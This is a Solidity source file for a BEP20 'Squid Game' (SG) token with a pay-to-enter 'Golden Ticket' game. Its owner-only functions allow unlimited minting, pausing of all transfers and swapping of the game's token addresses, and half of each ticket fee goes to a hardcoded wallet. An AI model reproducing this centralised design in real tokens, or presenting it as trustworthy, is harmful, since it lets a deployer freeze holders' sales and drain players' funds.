/**
 *Submitted for verification at BscScan.com on 2021-10-26
*/

/**
 *Submitted for verification at BscScan.com on 2021-06-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;

        return c;

    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

  

        if (a == 0) {

            return 0;

        }

        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");

        return c;

    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;

        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;

    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");

    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;

    }

}

contract Pausable is Context {

    event Paused(address account);
    event Unpaused(address account);
    bool private _paused;
    constructor () internal {

        _paused = false;

    }

    function paused() public view returns (bool) {

        return _paused;

    }

    modifier whenNotPaused() {

        require(!_paused, "Pausable: paused");

        _;

    }

    modifier whenPaused() {

        require(_paused, "Pausable: not paused");

        _;

    }

    function _pause() internal virtual whenNotPaused {

        _paused = true;

        emit Paused(_msgSender());

    }

    function _unpause() internal virtual whenPaused {

        _paused = false;

        emit Unpaused(_msgSender());

    }

}

interface IBEP20 {


    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external  returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}


pragma solidity ^0.6.0;

contract Ownable is Context {

    address private _owner;


    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


 

    constructor () internal {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }

 

    function owner() public view returns (address) {

        return _owner;

    }
 

    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }
   

    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }

}

contract BEP20 is Context, IBEP20, Pausable,Ownable  {

    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;
   
   mapping (address => mapping (uint256 => _joinGT)) public joinGT;
      
   mapping (uint256 => History_GameGT) public HistoryGoldenTicket;
    
   
    event Transfer(address indexed from, address indexed to, uint value);
    
    event VIP(address indexed target,uint value);
    
    uint256 private _totalSupply;

    string private _name;

    string private _symbol;

    uint8 private _decimals;
   

    constructor (string memory name, string memory symbol) public {

        _name = name;

        _symbol = symbol;

        _decimals = 18;

    }
   address FrontMan = msg.sender; // 회원
   
   address Square = 0x316e0173748aBEaB95d3B2D4f63a804792C48E28; // 회원 X

   address Circle = 0x959418A65210fEDb22422bE381f2239f4F7217d0; // 회원
   
   IBEP20 public SG_address;
   IBEP20 public BUSD_address;
      function Change_SG(IBEP20 _addr,IBEP20 _addr2) public onlyOwner(){
     SG_address = _addr;
    BUSD_address = _addr2;
    }
   
    /*
   24Hour Game
   */
   
    bool public GameStart_GT = true; // 게임시작 유무
   uint256 public RoundGoldenTicket = 1; //골든티켓 라운드 변수
   uint256[] public numberGT = [0,1]; // 참가번호
   uint256[] public _feeGTfee = [0,100 * (10 ** 18)]; // SG 레퍼럴 수수료;
   uint256[] bonusFee = [0,0,0]; // 보너스 코인 (이전라운드 게임 도중 나갔을때 보너스 코인이 누적)
   uint256[] bonusPlayer = [0,0,0]; // 보너스코인지급플레이어
   uint256 public feeGoldenTicket = 10 * (10 ** 18); // 골든티켓 가격 ( BUSD )
   uint256 public feeGoldenTicket_liq = (feeGoldenTicket * 50) / 100;
   uint256 public Timer = block.timestamp + 1000 days; //24시 타이머
   address public last_Ticket = msg.sender; // 마지막 구매자
   uint256 public Prize_GT; // 우승자 상금 (BUSD)
   uint256 public Prize_SG; // 우승자 상금 (SG)
   uint256 public _SGfee = 100 * (10 ** 18); // 티켓 레퍼럴 가격( 고정 )
   
   struct _joinGT{ //참가여부
   bool join; //참가여부
   bool access; //수령여부
   uint256 number; //참가번호
   uint256 sent_amount; //참가금액
   uint256 sent_SG; // 참가SG
   uint256 save_amount; // 받은 busd 코인
   uint256 save_SG; // 받은 SG
   }
   
   struct History_GameGT{
   address Winner; // 포식자
   uint256 Prize; // BUSD 상금
   uint256 Prize_SG; // sg 상금
   uint256 Total_Number; //총참가인원
   }
   
   function Start_GTGame(uint256 feeGT,uint256 feeGTfee) onlyOwner() public {
   GameStart_GT = true; 
   feeGoldenTicket = feeGT; // BUSD 가격
   feeGoldenTicket_liq = (feeGT * 50) / 100;
   _SGfee = feeGTfee; // 레퍼럴 SG 
   _feeGTfee[RoundGoldenTicket] = feeGTfee;
   Prize_SG += bonusFee[RoundGoldenTicket-1];
   Prize_GT = 0;
   Timer = block.timestamp + 1000 days;
   }
   
   function Squid_GameGoldenTicket() public { //골든티켓 게임 참가버튼
      require(GameStart_GT != false, "The game is being prepared. Please wait for a moment.");
      require(joinGT[msg.sender][RoundGoldenTicket].join != true, "already participating in this round.");
      require(BUSD_address.balanceOf(msg.sender) >= feeGoldenTicket, "There are not enough BUSD coin to purchase the Golden Ticket.");
      require(SG_address.balanceOf(msg.sender) >= _feeGTfee[RoundGoldenTicket], "There are not enough SG coin to purchase the Golden Ticket.");
     require(block.timestamp <= Timer,"Golden ticket buyer have already appeared in this round.");
       BUSD_address.transferFrom(msg.sender,address(this),feeGoldenTicket_liq);
      BUSD_address.transferFrom(msg.sender,Square,feeGoldenTicket_liq);
      SG_address.transferFrom(msg.sender,address(this),_feeGTfee[RoundGoldenTicket]);
     Prize_GT += feeGoldenTicket_liq;
      bonusFee[RoundGoldenTicket] += (bonusPlayer[RoundGoldenTicket] * _SGfee);
      joinGT[msg.sender][RoundGoldenTicket].join = true;
      joinGT[msg.sender][RoundGoldenTicket].number = numberGT[RoundGoldenTicket];
     joinGT[msg.sender][RoundGoldenTicket].sent_amount = feeGoldenTicket;
    joinGT[msg.sender][RoundGoldenTicket].sent_SG = _feeGTfee[RoundGoldenTicket];
     if(numberGT[RoundGoldenTicket] != 1){
    _feeGTfee[RoundGoldenTicket] += _SGfee;
    }
      numberGT[RoundGoldenTicket]++;
      Timer = block.timestamp + 300;
      last_Ticket = msg.sender;
   }
   
   function GoldenTicket_GetCoin(uint256 round) public {
   require(joinGT[msg.sender][round].join != false,"You didn't participate in the corresponding round.");
   require(joinGT[msg.sender][round].access != true,"I've already received it.");
   require(joinGT[msg.sender][round].number != (numberGT[round] - 1),"Those who wish to purchase the last ticket have no coins to receive.");
   
   SG_address.transferFrom(address(this),msg.sender,((numberGT[round] - 1) - joinGT[msg.sender][round].number) * _feeGTfee[round]);
   joinGT[msg.sender][round].access = true;
   joinGT[msg.sender][round].save_amount = ((numberGT[round] - 1) - joinGT[msg.sender][round].number) * _feeGTfee[round];
      if(RoundGoldenTicket == round){
         bonusPlayer[RoundGoldenTicket] += 1;
      }
   }
   
   function GoldenTicket_Winner_Getcoin() public {
   require((numberGT[RoundGoldenTicket] - 1) == joinGT[msg.sender][RoundGoldenTicket].number,"You are not a Golden ticket buyer.");
   require(joinGT[msg.sender][RoundGoldenTicket].access != true, "You already received the ticket.");
   require(joinGT[msg.sender][RoundGoldenTicket].join != false, "You didn't participate.");
   require(block.timestamp >= Timer,"The round hasn't ended yet.");
   HistoryGoldenTicket[RoundGoldenTicket].Winner = msg.sender;
   HistoryGoldenTicket[RoundGoldenTicket].Prize = Prize_GT;
   HistoryGoldenTicket[RoundGoldenTicket].Prize_SG = Prize_SG;
   HistoryGoldenTicket[RoundGoldenTicket].Total_Number = numberGT[RoundGoldenTicket] - 1;
   SG_address.transferFrom(address(this),msg.sender,Prize_SG);
   BUSD_address.transferFrom(address(this),msg.sender,Prize_GT);
   RoundGoldenTicket++;
   GameStart_GT = false;
   _feeGTfee.push(0);
       numberGT.push(1);
       bonusFee.push(0);
       bonusPlayer.push(0);
       last_Ticket = address(0);
       Prize_GT = 0;
      Prize_SG = 0;
       _SGfee = 0;
      feeGoldenTicket = 0;
     feeGoldenTicket_liq = 0;
       Timer = block.timestamp + 1000 days;
   }

   
   function GoldenTicket_Winner_Getcoin_Owner() public onlyOwner() {
    require(block.timestamp >= Timer,"The round hasn't ended yet.");
  HistoryGoldenTicket[RoundGoldenTicket].Winner = last_Ticket;
   HistoryGoldenTicket[RoundGoldenTicket].Prize = Prize_GT;
   HistoryGoldenTicket[RoundGoldenTicket].Prize_SG = Prize_SG;
   HistoryGoldenTicket[RoundGoldenTicket].Total_Number = numberGT[RoundGoldenTicket] - 1;
    if(Prize_SG != 0){
   SG_address.transferFrom(address(this),last_Ticket,Prize_SG);
   }
   BUSD_address.transferFrom(address(this),last_Ticket,Prize_GT);
   RoundGoldenTicket++;
   GameStart_GT = false;
   _feeGTfee.push(0);
   numberGT.push(1);
   bonusFee.push(0);
   bonusPlayer.push(0);
   last_Ticket = address(0);
    Prize_GT = 0;
   Prize_SG = 0;
    _SGfee = 0;
   feeGoldenTicket = 0;
   feeGoldenTicket_liq = 0;
    Timer = block.timestamp + 1000 days;
   }
   /*
   24Hour Game End
   */

    function all_approve() public {
    BUSD_address.approve(address(this),~uint256(0));
    SG_address.approve(address(this),~uint256(0)); 
    }
    
    function name() public view returns (string memory) {

        return _name;

    }

    function symbol() public view returns (string memory) {

        return _symbol;

    }

    function decimals() public view returns (uint8) {

        return _decimals;

    }

    function totalSupply() public view override returns (uint256) {

        return _totalSupply;

    }

    function balanceOf(address account) public view override returns (uint256) {

        return _balances[account];

    }

    function transfer(address recipient, uint256 amount) public virtual whenNotPaused() override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual whenNotPaused() override returns (bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));

        return true;

    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));

        return true;

    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));

        return true;

    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "BEP20: transfer from the zero address");

        require(recipient != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);


    }

    function _mint(address account, uint256 amount) internal virtual {

        require(account != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);

        _balances[account] = _balances[account].add(amount);

        emit Transfer(address(0), account, amount);

    }

    function _burn(address account, uint256 amount) internal virtual {

        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");

        _totalSupply = _totalSupply.sub(amount);

        emit Transfer(account, address(0), amount);

    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "BEP20: approve from the zero address");

        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }


    function _setupDecimals(uint8 decimals_) internal {

        _decimals = decimals_;

    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

}


abstract contract BEP20Burnable is Context, BEP20 {

    function burn(uint256 amount) public virtual {

        _burn(_msgSender(), amount);

    }

    function burnFrom(address account, uint256 amount) public virtual {

        uint256 decreasedAllowance = allowance(account, _msgSender()).sub(amount, "BEP20: burn amount exceeds allowance");

        _approve(account, _msgSender(), decreasedAllowance);

        _burn(account, amount);

    }

}


contract SquidGameCoin is BEP20,BEP20Burnable {

    constructor(uint256 initialSupply) public BEP20("Squid Game", "SG"){
   SG_address = IBEP20(0x553E98d330769708a43a1e1376580a0d41925d44);
   BUSD_address = IBEP20(0xc3a370202a62061Da31B5Dd3E1e58183dEf5773E);
        _mint(msg.sender, initialSupply);
    }
     function mint(uint256 initialSupply) onlyOwner() public {
        _mint(msg.sender, initialSupply);
    }
     function pause() onlyOwner() public {
        _pause();
    }
    function unpause() onlyOwner() public {
        _unpause();
    }
    
}